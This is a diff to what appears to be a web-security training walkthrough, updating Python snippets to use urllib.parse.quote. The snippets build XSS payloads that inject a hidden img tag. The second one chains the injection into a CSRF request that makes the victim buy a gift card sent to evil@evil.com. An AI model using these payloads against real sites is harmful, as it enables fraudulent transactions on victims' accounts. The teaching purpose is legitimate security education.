@@ -76,12 +76,16 @@ Start with the URL:
 Create a replacement for the qs parameter using an interactive Python shell (or
 your favorite way to urlencode data):
 
-    import urllib
+    from urllib.parse import quote
     s = '''";var i=document.createElement('img');''' +\
         '''i.src='http://test/image.jpg';''' +\
         '''i.setAttribute('display', 'none');''' +\
         '''document.body.appendChild(i);"'''
-    urllib.quote(s)
+    quote(s)
+
+For Python 2, change the first line of that to:
+
+    from urllib import quote
 
 The triple quoting is important here so that the single and double quotes
 within the string are handled correctly.
@@ -164,13 +168,17 @@ Start by looking at the giftcard form to find the paramters the form will send:
 
 Build the malicious payload in an interactive Python shell:
 
-    import urllib
+    from urllib.parse import quote
     url = '/csrf/gift-card?email=evil@evil.com&amount=100'
     js = '''";var i=document.createElement('img');''' +\
         '''i.src=%r;''' +\
         '''i.setAttribute('display', 'none');''' +\
         '''document.body.appendChild(i);"'''
-    urllib.quote(js % url)
+    quote(js % url)
+
+For Python 2, change the first line of that to:
+
+    from urllib import quote
 
 Use the resulting value in the qs parameter:
 
